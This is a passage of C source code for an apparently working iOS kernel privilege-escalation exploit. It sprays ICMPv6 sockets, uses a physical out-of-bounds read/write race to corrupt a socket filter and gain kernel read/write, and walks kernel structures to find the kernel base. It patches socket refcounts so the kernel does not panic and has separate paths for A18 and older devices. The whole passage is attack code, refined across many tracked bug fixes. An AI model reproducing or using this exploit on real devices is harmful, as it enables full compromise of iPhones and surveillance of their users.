        int sock = fileport_makefd(socket_ports[control_socket_idx]);
        if (sock < 0) {
            pe_log("fileport_makefd failed for control socket idx %lld", control_socket_idx);
            return fail_after_corruption_cleanup();
        }
        socklen_t gl = (socklen_t)getsockopt_read_length;
        int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockopt_read_data, &gl);
        if (res != 0) {
            pe_log("getsockopt failed (corrupt check)!");
            return fail_after_corruption_cleanup();
        }

        uint64_t marker = *(uint64_t *)getsockopt_read_data;
        if (marker != 0xffffffffffffffffULL) {
            pe_log("found control_socket at idx: 0x%llx", (uint64_t)control_socket_idx);
            if ((uint64_t)(control_socket_idx + 1) >= socket_ports_count) {
                pe_log("rw socket index out of range: control=%lld count=%llu", control_socket_idx, socket_ports_count);
                return fail_after_corruption_cleanup();
            }
            control_socket = sock;
            rw_socket = fileport_makefd(socket_ports[control_socket_idx + 1]);
            if (rw_socket < 0) {
                pe_log("fileport_makefd failed for rw socket idx %lld", control_socket_idx + 1);
                control_socket = -1;
                return fail_after_corruption_cleanup();
            }
            return KERN_SUCCESS;
        } else {
            pe_log("failed to corrupt control_socket at idx: 0x%llx", (uint64_t)control_socket_idx);
            /* Bug #302: this is a false-positive candidate. The OOB corruption
             * already stuck in the target inpcb, so we must rollback it BEFORE
             * releasing the temporary fd or the later spray teardown can free
             * an embedded icmp6filt slot as if it were a standalone
             * data.kalloc.32 object. */
            restore_corrupted_socket_filter_best_effort();
            rw_socket_pcb = 0;
            g_corruption_snapshot_pcb = 0;
            g_corruption_snapshot_filter_qword0 = 0;
            g_corruption_snapshot_filter_qword1 = 0;
            close(sock);
        }
    }
    return -1;
}

/* ================================================================
   iOS version detection
   ================================================================ */

static int get_ios_major_version(void) {
    char buf[256] = {0};
    size_t len = sizeof(buf);
    sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    int build = atoi(buf);
    if (build >= 23) return 26;
    if (build >= 22) return 18;
    if (build >= 21) return 17;
    return 18;
}

/* ================================================================
   Leak sockets to prevent use-after-free crash on cleanup
   ================================================================ */

/* Bug #222/#223: safe 32-bit kernel read at a 4-byte-aligned heap address.
 * set_target_kaddr() only accepts 8-byte-aligned addresses.
 * This helper rounds DOWN to 8-byte boundary, reads 8 bytes, and extracts
 * the correct 32-bit half.  Always touches mapped pages (the zone object is
 * guaranteed to span the entire cache-line). */
static bool kread32_aligned(uint64_t addr, uint32_t *out) {
    uint64_t aligned = addr & ~7ULL;
    if (!set_target_kaddr(aligned)) return false;
    uint64_t qw = early_kread64(aligned);
    if (addr & 4)
        *out = (uint32_t)(qw >> 32);   /* upper half */
    else
        *out = (uint32_t)(qw);          /* lower half */
    return true;
}

/* Bug #222/#223: safe 32-bit kernel write at a 4-byte-aligned heap address.
 * Reads 8 bytes from 8-byte-aligned boundary, patches the correct 32-bit
 * half, writes back 8 bytes.  Never corrupts the adjacent 32-bit field. */
static bool kwrite32_aligned(uint64_t addr, uint32_t val) {
    uint64_t aligned = addr & ~7ULL;
    if (!set_target_kaddr(aligned)) return false;
    uint64_t qw = early_kread64(aligned);
    if (addr & 4)
        qw = (qw & 0x00000000FFFFFFFFULL) | ((uint64_t)val << 32);
    else
        qw = (qw & 0xFFFFFFFF00000000ULL) | (uint64_t)val;
    early_kwrite64(aligned, qw);
    return true;
}

static void krw_sockets_leak_forever(void) {
    /*
     * If we skip this stage entirely, the corrupted ICMPv6 sockets remain tied
     * to the process lifetime only. When the app is killed, socket cleanup can
     * touch dangling state and panic the kernel. So we re-enable the original
     * leak/refcount patch, but only behind strict pointer guards.
     */
    const uint64_t pcb_socket_offset       = 0x40;
    /* Bug #221: so_count offset differs by iOS version.
     * iOS 16 and earlier: 0x228
     * iOS 17+:            0x24c  (struct socket grew ~36 bytes)
     * Confirmed: iOS 17.3.1 device log (darksword_live2.txt) shows
     *   so_count raw=0x1 / raw=0x2 at offset 0x24c — valid refcounts.
     *
     * Bug #222/#223: offset 0x24c is 4-byte aligned but NOT 8-byte aligned.
     * early_kread64/early_kwrite64 need 8-byte aligned addresses.
     * Also, early_kwrite64 writes 8 bytes, corrupting the adjacent field.
     * Solution: use kread32_aligned/kwrite32_aligned for EACH 32-bit field
     * (so_usecount and so_retaincnt) separately. */
    const int ios_ver = get_ios_major_version();
    const uint64_t so_usecount_offset  = (ios_ver >= 17) ? 0x24cULL : 0x228ULL;
    const uint64_t so_retaincnt_offset = so_usecount_offset + 4;  /* adjacent int32 */
    const uint64_t icmp6filt_offset    = 0x148;
    const uint32_t refcount_bump       = 0x1001;   /* bump by 4097 */

    pe_log("krw leak: using so_usecount offset 0x%llx, so_retaincnt offset 0x%llx (iOS %d)",
           so_usecount_offset, so_retaincnt_offset, ios_ver);

    /* REQUIRE zone bounds — if discovery completely failed, skip leak */
    if (!g_zone_map_min || !g_zone_map_max) {
        pe_log("krw leak skipped: zone bounds not set (discovery failed)");
        return;
    }
    if (control_socket_pcb < g_zone_map_min || control_socket_pcb >= g_zone_map_max ||
        rw_socket_pcb < g_zone_map_min || rw_socket_pcb >= g_zone_map_max) {
        pe_log("krw leak skipped: pcb outside zone_map [0x%llx,0x%llx) control=0x%llx rw=0x%llx",
               g_zone_map_min, g_zone_map_max, control_socket_pcb, rw_socket_pcb);
        return;
    }

    uint64_t control_socket_addr = early_kread64(control_socket_pcb + pcb_socket_offset);
    uint64_t rw_socket_addr      = early_kread64(rw_socket_pcb + pcb_socket_offset);

    /* Zone-bounds check on socket addresses */
    if (control_socket_addr < g_zone_map_min || control_socket_addr >= g_zone_map_max ||
        rw_socket_addr < g_zone_map_min || rw_socket_addr >= g_zone_map_max) {
        pe_log("krw leak skipped: socket addr outside zone_map [0x%llx,0x%llx) control=0x%llx rw=0x%llx",
               g_zone_map_min, g_zone_map_max, control_socket_addr, rw_socket_addr);
        return;
    }

    pe_log("krw leak: control_socket=0x%llx rw_socket=0x%llx",
           control_socket_addr, rw_socket_addr);

    /* --- Read so_usecount (32-bit) via aligned helper --- */
    uint32_t ctrl_usecount = 0, rw_usecount = 0;
    bool ctrl_use_ok = kread32_aligned(control_socket_addr + so_usecount_offset, &ctrl_usecount);
    bool rw_use_ok   = kread32_aligned(rw_socket_addr + so_usecount_offset, &rw_usecount);

    /* --- Read so_retaincnt (32-bit) at +4 --- */
    uint32_t ctrl_retaincnt = 0, rw_retaincnt = 0;
    bool ctrl_ret_ok = kread32_aligned(control_socket_addr + so_retaincnt_offset, &ctrl_retaincnt);
    bool rw_ret_ok   = kread32_aligned(rw_socket_addr + so_retaincnt_offset, &rw_retaincnt);

    pe_log("krw leak: so_usecount ctrl=%u rw=%u (read_ok=%d/%d)",
           ctrl_usecount, rw_usecount, ctrl_use_ok, rw_use_ok);
    pe_log("krw leak: so_retaincnt ctrl=%u rw=%u (read_ok=%d/%d)",
           ctrl_retaincnt, rw_retaincnt, ctrl_ret_ok, rw_ret_ok);

    /* Sanity check: real refcounts should be small integers (1-100).
     * If 0 or > 0x10000, the offset is wrong — do NOT write. */
    bool do_bump = true;
    if (!ctrl_use_ok || !rw_use_ok) {
        pe_log("krw leak: SKIPPING — so_usecount read failed");
        do_bump = false;
    }
    if (ctrl_usecount == 0 || ctrl_usecount > 0x10000 ||
        rw_usecount == 0 || rw_usecount > 0x10000) {
        pe_log("krw leak: SKIPPING — so_usecount invalid (ctrl=%u rw=%u)",
               ctrl_usecount, rw_usecount);
        do_bump = false;
    }

    if (do_bump) {
        /* Bump so_usecount (32-bit write, does NOT touch adjacent field) */
        kwrite32_aligned(control_socket_addr + so_usecount_offset, ctrl_usecount + refcount_bump);
        kwrite32_aligned(rw_socket_addr + so_usecount_offset, rw_usecount + refcount_bump);

        /* Bump so_retaincnt IF it also looks valid */
        if (ctrl_ret_ok && ctrl_retaincnt > 0 && ctrl_retaincnt < 0x10000) {
            kwrite32_aligned(control_socket_addr + so_retaincnt_offset, ctrl_retaincnt + refcount_bump);
        } else {
            pe_log("krw leak: skip ctrl so_retaincnt bump (val=%u ok=%d)", ctrl_retaincnt, ctrl_ret_ok);
        }
        if (rw_ret_ok && rw_retaincnt > 0 && rw_retaincnt < 0x10000) {
            kwrite32_aligned(rw_socket_addr + so_retaincnt_offset, rw_retaincnt + refcount_bump);
        } else {
            pe_log("krw leak: skip rw so_retaincnt bump (val=%u ok=%d)", rw_retaincnt, rw_ret_ok);
        }
        pe_log("krw leak: refcount bumped OK (usecount += 0x%x)", refcount_bump);
    }

    /*
     * Clear the second qword of the corrupted filter so socket teardown does
     * not chase stale data when the process exits.
     */
    early_kwrite64(rw_socket_pcb + icmp6filt_offset + 8, 0);

    /* Bug #301: once the leak/refcount patch is applied successfully, treat
     * the corrupted sockets as permanently leak-owned for this process.
     * Later panic-guard abort must not rollback icmp6filt on top of this. */
    g_socket_teardown_hardened = true;

    pe_log("krw leak: refcount patch applied successfully");
}

static void restore_corrupted_socket_filter_best_effort(void) {
    const uint64_t icmp6filt_offset = 0x148;

    if (!g_corruption_snapshot_valid) {
        pe_log("rollback: no corruption snapshot to restore");
        return;
    }
    if (!rw_socket_pcb || rw_socket_pcb != g_corruption_snapshot_pcb) {
        pe_log("rollback: snapshot PCB mismatch (snapshot=0x%llx current=0x%llx)",
               g_corruption_snapshot_pcb, rw_socket_pcb);
        return;
    }
    if (g_zone_map_min && g_zone_map_max &&
        (rw_socket_pcb < g_zone_map_min || rw_socket_pcb >= g_zone_map_max)) {
        pe_log("rollback: PCB outside zone bounds [0x%llx,0x%llx), pcb=0x%llx",
               g_zone_map_min, g_zone_map_max, rw_socket_pcb);
        return;
    }

        pe_log("rollback: restoring icmp6filt qword0 at pcb=0x%llx (orig=0x%llx), forcing qword1=0 for safe abort",
            rw_socket_pcb, g_corruption_snapshot_filter_qword0);

        /*
         * Bug #284: post-guard sessions can still panic in zone free path with
         * object pointer resolving to rw inpcb + 0x150 (icmp6filt second qword).
         *
         * Conservative abort policy:
         * - restore only qword0 from snapshot
         * - force qword1 to zero (same safe state as krw_sockets_leak_forever)
         *
         * This avoids reintroducing potentially toxic qword1 state while still
         * undoing the primary corruption slot used by exploit KRW staging.
         */
        early_kwrite64(rw_socket_pcb + icmp6filt_offset, g_corruption_snapshot_filter_qword0);
        early_kwrite64(rw_socket_pcb + icmp6filt_offset + 8, 0);

    g_corruption_snapshot_valid = false;
}

static void abort_cleanup_corrupted_sockets_best_effort(void) {
    int local_control_socket = control_socket;
    int local_rw_socket = rw_socket;

    if (local_control_socket < 0 && local_rw_socket < 0) {
        pe_log("abort-cleanup: no live socket fds");
        return;
    }

    pe_log("abort-cleanup: quarantine sockets without close (control=%d rw=%d)",
           local_control_socket, local_rw_socket);

    /*
     * Bug #281: close-time panic still reproduced on some guard-abort sessions
     * even after rollback logs, with panic address matching rw inpcb + 0x148.
     *
     * Safety policy for abort path:
     * - DO NOT call shutdown()/close() on corrupted exploit sockets here.
     * - Detach fds from global state and intentionally leak them for this
     *   process lifetime (same strategy as ds_run preflight leak guard).
     *
     * Rationale: forced teardown is the observed panic trigger point.
     */

    control_socket = -1;
    rw_socket = -1;
    control_socket_pcb = 0;
    rw_socket_pcb = 0;
    g_corruption_snapshot_valid = false;
    g_corruption_snapshot_pcb = 0;
    g_corruption_snapshot_filter_qword0 = 0;
    g_corruption_snapshot_filter_qword1 = 0;
}

/* ================================================================
   pe_init: prepare race infrastructure
   ================================================================ */

static bool pe_init(void) {
    if (!init_target_file()) {
        pe_log("pe_init: target file setup failed");
        return false;
    }

    if (!executable_name) {
        uint32_t length = 0x1024;
        char *executable_path = calloc(1, length);
        if (!executable_path) {
            pe_log("pe_init: executable_path alloc failed");
            close_target_fds();
            return false;
        }
        if (_NSGetExecutablePath(executable_path, &length) != 0) {
            char *tmp = realloc(executable_path, length);
            if (!tmp) {
                pe_log("pe_init: executable_path realloc failed");
                free(executable_path);
                close_target_fds();
                return false;
            }
            executable_path = tmp;
            if (_NSGetExecutablePath(executable_path, &length) != 0) {
                pe_log("pe_init: _NSGetExecutablePath failed");
                free(executable_path);
                close_target_fds();
                return false;
            }
        }
        char *base = strrchr(executable_path, '/');
        char *dup = strdup(base ? base + 1 : executable_path);
        free(executable_path);
        if (!dup) {
            pe_log("pe_init: strdup(executable_name) failed");
            close_target_fds();
            return false;
        }
        executable_name = dup;
    }
    pe_log("executable_name: %s", executable_name);

    g_free_thread_arg = calloc(1, PAGE_SZ);
    pe_log("free_thread_arg: %p", g_free_thread_arg);
    if (!g_free_thread_arg) {
        pe_log("pe_init: free_thread_arg alloc failed");
        close_target_fds();
        return false;
    }

    free_thread_start_ptr         = (volatile uint64_t *)(g_free_thread_arg + 0x00);
    free_target_sync_ptr          = (volatile uint64_t *)(g_free_thread_arg + 0x08);
    free_target_size_sync_ptr     = (volatile uint64_t *)(g_free_thread_arg + 0x10);
    target_object_sync_ptr        = (volatile uint64_t *)(g_free_thread_arg + 0x18);
    target_object_offset_sync_ptr = (volatile uint64_t *)(g_free_thread_arg + 0x20);
    go_sync_ptr                   = (volatile uint64_t *)(g_free_thread_arg + 0x28);
    race_sync_ptr                 = (volatile uint64_t *)(g_free_thread_arg + 0x30);

    int pr = pthread_create(&free_thread_jsthread, NULL, free_thread, g_free_thread_arg);
    if (pr != 0) {
        pe_log("pe_init: pthread_create failed (%d)", pr);
        free(g_free_thread_arg);
        g_free_thread_arg = NULL;
        close_target_fds();
        return false;
    }
    g_free_thread_created = true;
    return true;
}

/* ================================================================
   pe_v1: main exploit path for non-A18 devices (A12-A17, M1-M2)
   ================================================================ */

static void pe_v1(void) {
    uint64_t n_of_total_search_mapping_pages = 0x1000ULL * 0x10;
    uint64_t search_mapping_size = 0x2000ULL * PAGE_SZ;
    uint64_t total_search_mapping_size = n_of_total_search_mapping_pages * PAGE_SZ;
    uint64_t n_of_search_mappings = total_search_mapping_size / search_mapping_size;

    void *read_buffer  = calloc(1, oob_size);
    void *write_buffer = calloc(1, oob_size);
    if (!read_buffer || !write_buffer) {
        pe_log("pe_v1: buffer allocation failed");
        free(read_buffer);
        free(write_buffer);
        return;
    }
    if (!initialize_physical_read_write(n_of_oob_pages * PAGE_SZ)) {
        pe_log("pe_v1: failed to initialize physical read/write");
        free(read_buffer);
        free(write_buffer);
        return;
    }

    for (int attempt = 1; attempt <= MAX_PE_V1_ATTEMPTS; attempt++) {
        mach_vm_address_t *search_mappings = calloc(n_of_search_mappings, sizeof(*search_mappings));
        if (!search_mappings) {
            pe_log("pe_v1: search_mappings allocation failed");
            break;
        }
        uint64_t allocated_search_mappings = 0;
        for (uint64_t s = 0; s < n_of_search_mappings; s++) {
            mach_vm_address_t search_mapping_address = 0;
            kern_return_t kr = mach_vm_allocate(mach_task_self(), &search_mapping_address,
                search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
            if (kr != KERN_SUCCESS) {
                pe_log("pe_v1: mach_vm_allocate failed after %llu/%llu search mappings",
                       allocated_search_mappings, n_of_search_mappings);
                break;
            }
            for (uint64_t k = 0; k < search_mapping_size; k += PAGE_SZ)
                uwrite64(search_mapping_address + k, random_marker);
            search_mappings[s] = search_mapping_address;
            allocated_search_mappings++;
        }

        if (allocated_search_mappings != n_of_search_mappings) {
            for (uint64_t s = 0; s < allocated_search_mappings; s++) {
                mach_vm_deallocate(mach_task_self(), search_mappings[s], search_mapping_size);
            }
            free(search_mappings);
            pe_log("pe_v1: incomplete search-mapping setup, retrying ds...");
            continue;
        }

        socket_ports_count = 0;
        uint64_t maxfiles = V1_SOCKET_SPRAY_TARGET + V1_SOCKET_SPRAY_LEEWAY;
        uint64_t leeway  = V1_SOCKET_SPRAY_LEEWAY;
        pe_log("spraying %llu sockets (conservative cap)...", maxfiles - leeway);
        for (uint64_t socket_count = 0; socket_count < maxfiles - leeway; socket_count++) {
            mach_port_t port = spray_socket();
            if (port == (mach_port_t)-1) {
                pe_log("failed to spray sockets: 0x%llx", socket_ports_count);
                break;
            } else {
                socket_ports_count++;
            }
        }

        if (socket_ports_count == 0) {
            pe_log("socket spray produced 0 sockets, retrying ds...");
            for (uint64_t s = 0; s < n_of_search_mappings; s++) {
                if (search_mappings[s] != 0) {
                    mach_vm_deallocate(mach_task_self(), search_mappings[s], search_mapping_size);
                }
            }
            free(search_mappings);
            continue;
        }

        uint64_t start_pcb_id = socket_pcb_ids[0];
        uint64_t end_pcb_id   = socket_pcb_ids[socket_ports_count - 1];
        pe_log("socket_ports_count: 0x%llx", socket_ports_count);
        pe_log("start_pcb_id: 0x%llx", start_pcb_id);
        pe_log("end_pcb_id: 0x%llx", end_pcb_id);

        bool success = false;
        for (uint64_t s = 0; s < n_of_search_mappings; s++) {
            mach_vm_address_t search_mapping_address = search_mappings[s];
            pe_log("looking in search mapping: %llu", s);
            memory_object_size_t memory_object_size = search_mapping_size;
            mach_port_t memory_object = MACH_PORT_NULL;
            kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &memory_object_size,
                search_mapping_address, VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL);
            if (kr != 0) { pe_log("mach_make_memory_entry_64 failed!"); break; }
            target_object_size = memory_object_size;

            surface_mlock(search_mapping_address, search_mapping_size);

            uint64_t seeking_offset = 0;
            while (seeking_offset < search_mapping_size) {
                kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
                if (kr == KERN_SUCCESS) {
                    if (find_and_corrupt_socket(memory_object, seeking_offset,
                        read_buffer, write_buffer, false) == KERN_SUCCESS) {
                        success = true;
                        break;
                    }
                }
                seeking_offset += PAGE_SZ;
            }
            mach_port_deallocate(mach_task_self(), memory_object);
            if (success) break;
        }

        sockets_release();
        for (uint64_t s = 0; s < n_of_search_mappings; s++)
            mach_vm_deallocate(mach_task_self(), search_mappings[s], search_mapping_size);
        free(search_mappings);

        if (success) break;
        pe_log("pe_v1: retrying ds... (%d/%d)", attempt, MAX_PE_V1_ATTEMPTS);
    }

    if (control_socket == 0 || rw_socket == 0) {
        pe_log("pe_v1: exploit failed after %d attempts", MAX_PE_V1_ATTEMPTS);
    }

    free(read_buffer);
    free(write_buffer);
}

/* ================================================================
   pe_v2: exploit path for A18 devices (wired-page tracking)
   ================================================================ */

static void pe_v2(void) {
    void *read_buffer  = calloc(1, oob_size);
    void *write_buffer = calloc(1, oob_size);
    if (!read_buffer || !write_buffer) {
        pe_log("pe_v2: buffer allocation failed");
        free(read_buffer);
        free(write_buffer);
        return;
    }
    if (!initialize_physical_read_write(n_of_oob_pages * PAGE_SZ)) {
        pe_log("pe_v2: failed to initialize physical read/write");
        free(read_buffer);
        free(write_buffer);
        return;
    }

    uint64_t wired_mapping_entry_size = PAGE_SZ;
    uint64_t wired_mapping_entries_total_size = 1024ULL * 1024 * 1024 * 2;
    uint64_t n_of_wired_mapping_entries = wired_mapping_entries_total_size / wired_mapping_entry_size;

    pe_log("allocating wired memory (%llu entries)...", n_of_wired_mapping_entries);
    mach_vm_address_t *wired_mapping_entries_addresses = calloc(n_of_wired_mapping_entries, sizeof(*wired_mapping_entries_addresses));
    if (!wired_mapping_entries_addresses) {
        pe_log("pe_v2: wired mapping entries allocation failed");
        free(read_buffer);
        free(write_buffer);
        return;
    }
    uint64_t wired_entries_count = n_of_wired_mapping_entries;

    kern_return_t kr;
    mach_vm_address_t wired_address = 0;

    for (uint64_t i = 0; i < n_of_wired_mapping_entries; i++) {
        if (i == 0) {
            int alloc_tries = 0;
            do {
                wired_address = 0;
                kr = mach_vm_allocate(mach_task_self(), &wired_address,
                    wired_mapping_entry_size, VM_FLAGS_ANYWHERE);
            } while (kr != KERN_SUCCESS && ++alloc_tries < 256);
        } else {
            wired_address = wired_mapping_entries_addresses[i - 1];
            int alloc_tries = 0;
            do {
                wired_address += wired_mapping_entry_size;
                kr = mach_vm_allocate(mach_task_self(), &wired_address,
                    wired_mapping_entry_size, VM_FLAGS_FIXED);
            } while (kr != KERN_SUCCESS && ++alloc_tries < 256);
        }
        if (kr != KERN_SUCCESS) {
            pe_log("pe_v2: mach_vm_allocate failed for wired page %llu", i);
            wired_entries_count = i;
            break;
        }
        wired_mapping_entries_addresses[i] = wired_address;
        surface_mlock(wired_address, wired_mapping_entry_size);
        uwrite64(wired_address, wired_page_marker);
        uwrite64(wired_address + 8, wired_address);
    }
    if (wired_entries_count == 0) {
        pe_log("pe_v2: unable to allocate any wired pages");
        free(wired_mapping_entries_addresses);
        free(read_buffer);
        free(write_buffer);
        return;
    }
    pe_log("allocating wired memory done");

    for (int attempt = 1; attempt <= MAX_PE_V2_ATTEMPTS; attempt++) {
        uint64_t search_mapping_size = 0x800ULL * PAGE_SZ;
        mach_vm_address_t search_mapping_address = 0;
        kr = mach_vm_allocate(mach_task_self(), &search_mapping_address,
            search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
        if (kr != KERN_SUCCESS) { pe_log("mach_vm_allocate failed!"); break; }

        for (uint64_t k = 0; k < search_mapping_size; k += PAGE_SZ)
            uwrite64(search_mapping_address + k, random_marker);
        surface_mlock(search_mapping_address, search_mapping_size);

        memory_object_size_t memory_object_size = search_mapping_size;
        mach_port_t memory_object = MACH_PORT_NULL;
        kr = mach_make_memory_entry_64(mach_task_self(), &memory_object_size,
            search_mapping_address, VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL);
        if (kr != 0) {
            pe_log("mach_make_memory_entry_64 failed!");
            mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
            break;
        }
        target_object_size = memory_object_size;

        socket_ports_count = 0;
        uint64_t max_sockets_count = V2_SOCKET_SPRAY_TARGET;
        uint64_t split_count = V2_SOCKET_SPRAY_SPLIT;
        mach_vm_address_t wired_pages[4096];
        uint64_t wired_pages_count = 0;
        bool success = false;
        uint64_t seeking_offset = 0;

        while (seeking_offset < search_mapping_size) {
            kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
            if (kr != KERN_SUCCESS) { seeking_offset += PAGE_SZ; continue; }

            if (*(uint64_t *)read_buffer == wired_page_marker) {
                uint64_t wired_page = *(uint64_t *)((uint8_t *)read_buffer + 8);
                pe_log("seeking_offset: 0x%llx: Found wired_page: 0x%llx", seeking_offset, wired_page);

                bool dup = false;
                for (uint64_t w = 0; w < wired_pages_count; w++)
                    if (wired_pages[w] == wired_page) { dup = true; break; }
                if (dup) { pe_log("found old wired page!"); seeking_offset += PAGE_SZ; continue; }
                wired_pages[wired_pages_count++] = wired_page;

                for (uint64_t j = 0; j < wired_entries_count; j++) {
                    if (wired_mapping_entries_addresses[j] == wired_page) {
                        wired_mapping_entries_addresses[j] = wired_mapping_entries_addresses[--wired_entries_count];
                        break;
                    }
                }
                uwrite64(wired_page, 0);
                uwrite64(wired_page + 8, 0);

                kr = mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
                if (kr != KERN_SUCCESS) pe_log("failed to deallocate wired page!");

                for (uint64_t socket_count = 0; socket_count < max_sockets_count / split_count; socket_count++) {
                    mach_port_t port = spray_socket();
                    if (port == (mach_port_t)-1) {
                        pe_log("failed to spray sockets: 0x%llx", socket_ports_count);
                        break;
                    } else {
                        socket_ports_count++;
                    }
                }

                if (find_and_corrupt_socket(memory_object, seeking_offset,
                    read_buffer, write_buffer, true) == KERN_SUCCESS) {
                    pe_log("seeking_offset: 0x%llx: Reallocated PCB page", seeking_offset);
                    success = true;
                    break;
                } else {
                    if (socket_ports_count >= max_sockets_count) {
                        sockets_release();
                        pe_log("waiting for zone trimming...");
                        sleep(20);
                    }
                    seeking_offset = 0;
                }
            } else if (find_and_corrupt_socket(memory_object, seeking_offset,
                       read_buffer, write_buffer, false) == KERN_SUCCESS) {
                pe_log("seeking_offset: 0x%llx: Found PCB page", seeking_offset);
                success = true;
                break;
            } else {
                seeking_offset += PAGE_SZ;
            }
        }

        mach_port_deallocate(mach_task_self(), memory_object);
        sockets_release();
        mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
        if (success) break;
        pe_log("retrying ds (a18 path) (%d/%d)", attempt, MAX_PE_V2_ATTEMPTS);
    }

    if (control_socket == 0 || rw_socket == 0) {
        pe_log("pe_v2: exploit failed after %d attempts", MAX_PE_V2_ATTEMPTS);
    }

    for (uint64_t i = 0; i < wired_entries_count; i++)
        mach_vm_deallocate(mach_task_self(), wired_mapping_entries_addresses[i], wired_mapping_entry_size);
    free(wired_mapping_entries_addresses);
    free(read_buffer);
    free(write_buffer);
}

/* ================================================================
   pe: master exploit function — selects v1 or v2 based on device
   ================================================================ */

static int pe(void) {
    struct utsname utsname;
    uname(&utsname);
    char *device_machine = utsname.machine;
    pe_log("device: %s", device_machine);

    if (strstr(device_machine, "iPhone17,")) {
        pe_log("running on a18 device");
        is_a18_devices = true;
        sleep(8);
        if (!pe_init()) return -1;
        pe_v2();
    } else {
        pe_log("running on non-a18 device");
        if (!pe_init()) return -1;
        pe_v1();
    }

    pe_log("highest_success_idx: %llu", highest_success_idx);
    pe_log("success_read_count: %llu", success_read_count);

    g_free_thread_should_exit = true;
    if (free_thread_start_ptr) uwrite64((uint64_t)free_thread_start_ptr, 1);
    if (go_sync_ptr) uwrite64((uint64_t)go_sync_ptr, 0);
    if (race_sync_ptr) uwrite64((uint64_t)race_sync_ptr, 1);
    if (g_free_thread_created) {
        pthread_join(free_thread_jsthread, NULL);
        g_free_thread_created = false;
    }

    close_target_fds();

    pe_log("Walking kernel structures...");

    /* SAFETY GUARD before first early_kread64: rw_socket_pcb must be in
     * valid kernel address range (zone objects are >= 0xffffffd0...).
     * If it slipped through find_and_corrupt_socket validation, abort here
     * instead of panicking the kernel.
     */
    if (rw_socket_pcb < 0xffffffd000000000ULL) {
        pe_log("PANIC GUARD: rw_socket_pcb=0x%llx is not a valid kernel address, aborting", rw_socket_pcb);
        rw_socket_pcb = 0;
        control_socket_pcb = 0;
        return panic_guard_abort_cleanup();
    }
    pe_log("rw_socket_pcb validated: 0x%llx", rw_socket_pcb);

    prime_zone_bounds_from_rw_pcb("pre-control-socket-pcb read");

    uint64_t control_socket_pcb_raw = 0;
    uint64_t control_socket_pcb_addr = rw_socket_pcb + 0x20;
    if (!early_kread_checked(control_socket_pcb_addr, &control_socket_pcb_raw, sizeof(control_socket_pcb_raw))) {
        pe_log("PANIC GUARD: failed to read control_socket_pcb at 0x%llx (zone=[0x%llx,0x%llx])",
               control_socket_pcb_addr, g_zone_map_min, g_zone_map_max);
        control_socket_pcb = 0;
        return panic_guard_abort_cleanup();
    }
    control_socket_pcb = pac_strip(control_socket_pcb_raw);
    if (control_socket_pcb < 0xffffffd000000000ULL) {
        pe_log("PANIC GUARD: control_socket_pcb=0x%llx is invalid, aborting", control_socket_pcb);
        control_socket_pcb = 0;
        return panic_guard_abort_cleanup();
    }

    uint64_t protosw_kernel_base = 0;
    bool have_protosw_kernel_base = derive_kernel_base_via_protosw(control_socket_pcb, &protosw_kernel_base);

    pe_log("control_socket_pcb: 0x%llx", control_socket_pcb);

    pe_log("reading pcbinfo at control_socket_pcb+0x38=0x%llx...", control_socket_pcb + 0x38);
    uint64_t pcbinfo_pointer_raw = 0;
    if (!early_kread_checked(control_socket_pcb + 0x38, &pcbinfo_pointer_raw, sizeof(pcbinfo_pointer_raw))) {
        pe_log("PANIC GUARD: failed to read pcbinfo pointer at 0x%llx", control_socket_pcb + 0x38);
        control_socket_pcb = 0;
        rw_socket_pcb = 0;
        return panic_guard_abort_cleanup();
    }
    uint64_t pcbinfo_pointer = pac_strip(pcbinfo_pointer_raw);
    pe_log("pcbinfo_pointer: 0x%llx", pcbinfo_pointer);
    if (pcbinfo_pointer < 0xfffffff000000000ULL) {
        pe_log("PANIC GUARD: pcbinfo_pointer=0x%llx is invalid, aborting", pcbinfo_pointer);
        control_socket_pcb = 0;
        rw_socket_pcb = 0;
        return panic_guard_abort_cleanup();
    }

    pe_log("reading ipi_zone at pcbinfo+0x68=0x%llx...", pcbinfo_pointer + 0x68);
    uint64_t ipi_zone = pac_strip(early_kread64(pcbinfo_pointer + 0x68));
    pe_log("ipi_zone: 0x%llx", ipi_zone);
    if (ipi_zone < 0xfffffff000000000ULL) {
        pe_log("PANIC GUARD: ipi_zone=0x%llx is invalid, aborting", ipi_zone);
        control_socket_pcb = 0;
        rw_socket_pcb = 0;
        return panic_guard_abort_cleanup();
    }

    pe_log("reading zv_name at ipi_zone+0x10=0x%llx...", ipi_zone + 0x10);
    uint64_t zv_name  = pac_strip(early_kread64(ipi_zone + 0x10));
    pe_log("zv_name: 0x%llx", zv_name);
    if (zv_name < 0xfffffff000000000ULL) {
        pe_log("PANIC GUARD: zv_name=0x%llx is invalid, aborting", zv_name);
        control_socket_pcb = 0;
        rw_socket_pcb = 0;
        return panic_guard_abort_cleanup();
    }

    char zone_name[32];
    bool have_valid_zone_name = false;
    if (zv_name >= 0xfffffff000000000ULL && early_kread_cstring(zv_name, zone_name, sizeof(zone_name))) {
        if (is_expected_ipi_zone_name(zone_name)) {
            have_valid_zone_name = true;
            pe_log("zone name: %s", zone_name);
        } else {
            pe_log("zone discovery guard: unexpected zone name '%s' at 0x%llx", zone_name, zv_name);
        }
    } else {
        pe_log("zone discovery guard: could not read valid zone name at 0x%llx", zv_name);
    }

    /* Discover zone map boundaries BEFORE any zone-memory reads.
     * This sets g_zone_map_min/max so that set_target_kaddr() can
     * block reads from zone metadata/bitmaps which are outside zone_map
     * and may cause kernel data abort (translation fault L3).
     * ipi_zone is in __DATA_CONST, so reads near it are safe (kernel text range).
     * rw_socket_pcb is in zone map, used to validate the found bounds. */
    pe_log("discovering zone boundaries...");
    discover_zone_boundaries_raw(have_valid_zone_name ? ipi_zone : 0);

    if (have_protosw_kernel_base) {
        kernel_base = protosw_kernel_base;
